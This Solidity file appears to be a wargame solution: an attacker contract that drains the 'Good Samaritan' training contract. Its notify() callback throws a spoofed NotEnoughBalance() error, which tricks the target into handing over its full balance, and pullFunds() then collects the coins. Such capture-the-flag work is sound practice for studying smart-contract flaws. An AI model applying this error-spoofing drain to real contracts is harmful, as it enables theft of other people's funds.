// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GoodSamaritan.sol";

contract GoodSamaritanHack is INotifyable {
  address public owner;
  Coin public coinAddress;
  GoodSamaritan public goodSamaritanAddress;

  // Our error to bug donation
  error NotEnoughBalance();

  constructor(address _coinAddress, address _goodSamaritanAddress) {
    coinAddress = Coin(_coinAddress);
    goodSamaritanAddress = GoodSamaritan(_goodSamaritanAddress);

    owner = msg.sender;
  }

  function beg() public {
    goodSamaritanAddress.requestDonation();
  }

  // Grab our funds
  function pullFunds() public {
    require(msg.sender == owner);
    coinAddress.transfer(owner, coinAddress.balances(address(this)));
  }

  function notify(uint256 _amount) pure override public {
    // Our callback to error in, only on first xfer,
    // Dont want to revert when it sends all remaining, we just
    // Wont take 10 donations
    if(_amount == 10) {
    revert NotEnoughBalance();
    }
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }

  // Function to receive Ether. msg.data must be empty
  receive() external payable {}

  // Fallback function is called if msg.data is not empty
  fallback() external payable {}
}